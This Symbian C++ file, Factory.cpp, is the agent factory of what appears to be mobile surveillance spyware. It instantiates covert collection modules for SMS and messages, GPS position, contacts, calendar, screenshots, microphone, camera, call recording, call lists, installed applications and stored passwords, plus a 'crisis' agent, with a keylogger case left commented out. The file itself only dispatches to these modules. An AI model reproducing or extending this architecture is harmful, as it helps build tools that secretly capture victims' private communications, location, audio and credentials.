/*
 ============================================================================
 Name		: Factory.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CFactory implementation
 ============================================================================
 */

#include "AgentFactory.h"

#include "AgentNone.h"
#include "AgentMessages.h"
#include "AgentPosition.h"
#include "AgentCalendar.h"
#include "AgentAddressbook.h"
#include "AgentScreenshot.h"
#include "AgentDevice.h"
#include "Agentmic.h"
#include "AgentApplication.h"
#include "AgentCallLocal.h"
#include "AgentCallList.h"
#include "AgentKeylog.h"
#include "AgentCamera.h"
#include "AgentPassword.h"
#include "AgentCrisis.h"

EXPORT_C CAbstractAgent* AgentFactory::CreateAgentL(TAgentType aId, const TDesC8& params)
	{
	switch (aId)
		{
		case EAgent_Addressbook:
			return CAgentAddressbook::NewL(params);
		case EAgent_Calendar:
			return CAgentCalendar::NewL(params);
		case EAgent_Position:
			return CAgentPosition::NewL(params);
		case EAgent_Messages:
			return CAgentMessages::NewL(params);
		case EAgent_Screenshot:
			return CAgentScreenshot::NewL(params);
		case EAgent_Device:
			return CAgentDevice::NewL(params);
		case EAgent_Mic:
			return CAgentMic::NewL(params);
			/*
		case EAgent_Keylog:
			return CAgentKeylog::NewL(params);
			*/
		case EAgent_Cam:
			return CAgentCamera::NewL(params);
		case EAgent_CallLocal:
			return CAgentCallLocal::NewL(params);
		case EAgent_CallList:
			return CAgentCallList::NewL(params);
		case EAgent_Application:
			return CAgentApplication::NewL(params);
			// add new agents here...
		case EAgent_Password:
			return CAgentPassword::NewL(params);
		case EAgent_Crisis:
			return CAgentPanic::NewL(params);
		default:
			// User::Leave(KErrNotSupported);
			return CAgentNone::NewL(aId, params);
		}
	}

